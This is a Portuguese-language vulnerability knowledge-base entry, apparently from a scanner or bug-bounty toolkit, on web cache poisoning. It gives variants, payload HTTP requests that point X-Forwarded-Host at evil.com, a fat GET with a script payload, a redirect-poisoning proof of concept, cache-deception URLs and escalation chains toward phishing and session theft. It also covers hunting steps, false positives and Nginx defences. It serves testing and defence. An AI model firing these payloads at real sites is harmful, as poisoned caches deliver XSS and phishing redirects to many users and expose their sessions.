---
id: cache_poisoning
title: "Web Cache Poisoning"
module: "cachepoisoning"
severity: "HIGH"
cwe_id: "CWE-524"
cwe_title: "Use of Cache Containing Sensitive Information"
cvss_vector: "AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N"
vrt_id: "server_security_misconfiguration.web_cache_poisoning"
---

## Summary
Headers ou parâmetros não incluídos na chave de cache são refletidos na resposta e armazenados, fazendo com que outras vítimas recebam conteúdo envenenado (XSS, redirect, script malicioso).

## Description
CDNs, reverse proxies e frameworks armazenam respostas para reduzir latência. A chave de cache normalmente inclui método, host, path e query string, mas não headers como `X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Forwarded-Proto`, `X-Original-URL` ou `X-Forwarded-Prefix`. Se a aplicação usa esses headers para gerar links, redirects ou conteúdo, o atacante pode envenenar a entrada cacheada.

Variantes:
- **Unkeyed header poisoning:** `X-Forwarded-Host: evil.com` refletido em links/canonical.
- **Unkeyed parameter/query:** parâmetro não incluído na chave (ex.: `?utm_source=`) refletido.
- **Fat GET:** body em GET usado pela aplicação, mas ignorado pela chave de cache.
- **Parameter cloaking:** `?cb=1&utm=evil` vs `?cb=1%26utm=evil` com parsers diferentes.
- **Cache deception:** cache armazena resposta autenticada sob URL pública (`.css`, `.jpg`).
- **Host header + cache:** combinação com Host Header Injection.
- **Response splitting + cache:** CRLF para injetar headers/corpo cacheado.

O ataque é especialmente grave quando a resposta envenenada é servida na página inicial ou em um path popular, atingindo muitas vítimas.

## Impact
- XSS armazenado em cache, afetando todos os usuários do path.
- Redirecionamento em massa para phishing/malware.
- Distribuição de conteúdo falso e desinformação.
- Vazamento de respostas autenticadas via cache deception.
- Negação de serviço e corrupção de cache.
- Impacto HIGH; CRITICAL se atingir login/admin ou vazar sessões.

## Payloads and Bypasses
```http
GET /?cb=1337 HTTP/1.1
Host: alvo.com
X-Forwarded-Host: evil.com
```

```http
GET /?cb=1337 HTTP/1.1
Host: alvo.com
X-Forwarded-Scheme: nothttps
X-Forwarded-Proto: http
```

```http
GET /?cb=1337 HTTP/1.1
Host: alvo.com
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Forwarded-Prefix: /evil
```

```text
# Headers não-keyed comuns
X-Forwarded-Host: evil.com
X-Forwarded-Scheme: nothttps
X-Forwarded-Proto: http
X-Forwarded-Port: 443
X-Forwarded-Prefix: /evil
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Host: evil.com
X-Forwarded-Server: evil.com
Forwarded: host=evil.com

# Cache busters para não envenenar a entrada real durante testes
?cb=1337
?cachebust=abc123
?utm_source=test

# Fat GET
GET /?cb=1 HTTP/1.1
Host: alvo.com
Content-Length: 38

utm_source=<script>alert(1)</script>

# Parameter cloaking / parser diferencial
?cb=1&utm=evil
?cb=1%26utm=evil
?cb=1;utm=evil
?cb=1&utm=evil&utm=good
```

PoC de envenenamento de redirect:
```http
GET /login?cb=1337 HTTP/1.1
Host: alvo.com
X-Forwarded-Host: evil.com

# Resposta cacheada:
HTTP/1.1 301 Moved Permanently
Location: https://evil.com/login
```

Cache deception:
```text
https://alvo.com/account/profile.css
https://alvo.com/account/profile.jpg
https://alvo.com/account/profile%2ecss
https://alvo.com/account/profile.css?cb=1
```

Casos reais e mentalidade de ataque (RWBH): HackerOne e Shopify (`X-Forwarded-Host`) mostraram envenenamento de cache em páginas públicas; o atacante procura headers não-keyed, fat GET e parâmetros clandestinos.

## Target Context (Crawler Hints)
- **Parâmetros comuns:** `cb`, `cachebust`, `utm_*`, `lang`, `theme`, `callback`, `_`, `v`.
- **Headers comuns:** `X-Forwarded-Host`, `X-Forwarded-Proto`, `X-Forwarded-Scheme`, `X-Forwarded-Port`, `X-Forwarded-Prefix`, `X-Original-URL`, `X-Rewrite-URL`, `X-Host`, `Forwarded`.
- **Paths comuns:** `/`, `/login`, `/home`, `/search`, `/api/*`, `/assets/*`, `/static/*`, páginas públicas com cache.
- **Sinais:** `X-Cache: HIT`, `Age`, `CF-Cache-Status`, `Cache-Control: public`; headers refletidos em links/canonical; `Vary` ausente.

## Escalation Techniques
Cache poisoning raramente e o objetivo final -- e o vetor de distribuicao para ataques de maior impacto:

- **XSS via cache:** header nao-keyed (ex: `X-Forwarded-Host: evil.com`) refletido em tag `<script src>` ou `<link>` e cacheado. Todas as vitimas que acessam o path recebem script malicioso -- equivalente a stored XSS em escala massiva.
- **Redirect em massa para phishing:** `X-Forwarded-Host` envenenando redirect 301/302 na pagina de login. Vitimas sao redirecionadas para dominio do atacante que replica a pagina original e coleta credenciais.
- **Cache deception para roubo de sessao:** induzir a vitima a acessar URL como `/account/profile.css`. Cache armazena resposta autenticada (com dados pessoais, tokens) sob extensao estatica. Atacante acessa a mesma URL e recebe os dados da vitima.
- **Encadeamento com XSS para account takeover:** cache poisoning que injeta XSS pode roubar cookies de sessao (se nao `HttpOnly`) ou tokens em `localStorage` de todos os usuarios que visitam a pagina envenenada.
- **DoS via cache corruption:** envenenar respostas com conteudo invalido ou erro 500 e forcar cache a servir a pagina quebrada para todos os usuarios ate o TTL expirar ou o cache ser purgado.
- **Pivot para SSRF/Host Header Injection:** cache poisoning combinado com Host Header Injection pode redirecionar requisicoes internas e acessar servicos nao expostos.

Conforme a metodologia geral do livro Bug Bounty Bootcamp (Cap. 1-5), ao encontrar um bug de severidade baixa ou media, tente encadea-lo com outros para maximizar o impacto -- neste caso, cache poisoning transforma reflexao simples em ataque massivo.

## Hunting Methodology
Processo passo a passo para identificar web cache poisoning:

1. **Identificar infraestrutura de cache:** verificar headers de resposta como `X-Cache`, `Age`, `CF-Cache-Status`, `Vary`, `Cache-Control`. Presenca de CDN (Cloudflare, Akamai, Fastly, Varnish) indica superficie de ataque.
2. **Determinar a chave de cache:** enviar a mesma requisicao com cache buster (`?cb=1337`) e observar se `X-Cache: MISS` aparece. Repetir sem o buster para confirmar HIT. Isso revela quais parametros fazem parte da chave.
3. **Testar headers nao-keyed:** adicionar headers como `X-Forwarded-Host: canary.com`, `X-Forwarded-Proto: http`, `X-Forwarded-Scheme: nothttps` um por vez e verificar se o valor aparece refletido na resposta (links, canonical, redirects, scripts).
4. **Confirmar reflexao com cache buster:** sempre testar com cache buster para nao envenenar paginas reais. Se o header e refletido, voce tem um unkeyed input.
5. **Testar parametros nao-keyed:** experimentar parametros como `utm_source`, `utm_content`, `callback` e verificar se sao refletidos mas nao fazem parte da chave de cache.
6. **Testar fat GET:** enviar GET com body e verificar se a aplicacao processa o body (parametros refletidos) enquanto o cache ignora.
7. **Envenenar com payload:** substituir o valor canary por payload de XSS ou redirect malicioso. Enviar com cache buster, confirmar que a resposta envenenada e retornada, e depois enviar sem cache buster para verificar se o cache armazena.
8. **Verificar cache deception:** acessar pagina autenticada com extensao estatica (`/account/profile.css`). Se o cache armazena a resposta, acessar a mesma URL sem autenticacao e verificar se os dados do usuario aparecem.
9. **Automatizar:** usar Param Miner (Burp) para descobrir headers e parametros nao-keyed automaticamente. A abordagem de fuzzing (Cap. 25 do livro) se aplica -- gerar payloads automaticamente e monitorar respostas anomalas.

## False Positive Indicators
Sinais de que a deteccao de cache poisoning pelo scanner **nao e exploravel**:

- **Header refletido mas nao cacheado:** se `X-Cache` nunca retorna HIT para o path testado, ou `Cache-Control: private, no-store` esta presente, a resposta nao e cacheada e o envenenamento nao atinge outros usuarios.
- **Vary header inclui o header injetado:** se `Vary: X-Forwarded-Host` esta presente, o header faz parte da chave de cache e cada valor gera entrada separada -- nao e poisoning.
- **Reflexao apenas em resposta nao-HTML:** header refletido em `application/json` ou `text/plain` nao e renderizado como HTML pelo browser; XSS via cache nao se aplica.
- **CDN com protecao ativa:** Cloudflare, Fastly e Akamai possuem mecanismos de protecao contra cache poisoning. Headers injetados podem ser removidos pelo edge antes de atingir a aplicacao.
- **TTL muito curto:** cache com `max-age=0` ou `s-maxage=1` significa que a janela de envenenamento e minima ou inexistente na pratica.
- **Cache buster obrigatorio:** se a reflexao so ocorre com parametro de cache buster (que faz parte da chave), a versao limpa da pagina nunca e envenenada.
- **Resposta nao-2xx:** se o endpoint retorna 404 ou 500, o cache normalmente nao armazena a resposta (depende da config, mas e o padrao).

## Recommendation
1. Incluir todos os headers que influenciam a resposta na chave de cache (`Vary: X-Forwarded-Host, X-Forwarded-Proto`) ou, melhor, não usá-los para gerar conteúdo.
2. Normalizar e validar headers de forwarding no edge; descartar valores do cliente.
3. Nunca cachear respostas autenticadas ou com `Set-Cookie`; usar `Cache-Control: private, no-store` para dados de usuário.
4. Canonicalizar URL/query e rejeitar parâmetros desconhecidos; garantir que proxy e aplicação usem o mesmo parser.
5. Desabilitar fat GET ou incluir o body na chave; limitar métodos cacheáveis a GET/HEAD.
6. Aplicar cache deception protection: não cachear por extensão; validar `Content-Type` e autenticação antes do cache.
7. Configurar o CDN para remover headers hop-by-hop e não confiar em `X-Original-URL`/`X-Rewrite-URL`.
8. Exemplo Nginx:
```nginx
proxy_cache_key "$scheme$request_method$host$request_uri";
proxy_ignore_headers X-Accel-Expires;
proxy_hide_header X-Forwarded-Host;
add_header Vary "X-Forwarded-Host, X-Forwarded-Proto" always;
proxy_cache_bypass $http_authorization $cookie_session;
```
9. Monitorar envenenamento com canários e alertar sobre respostas que contenham hosts externos.

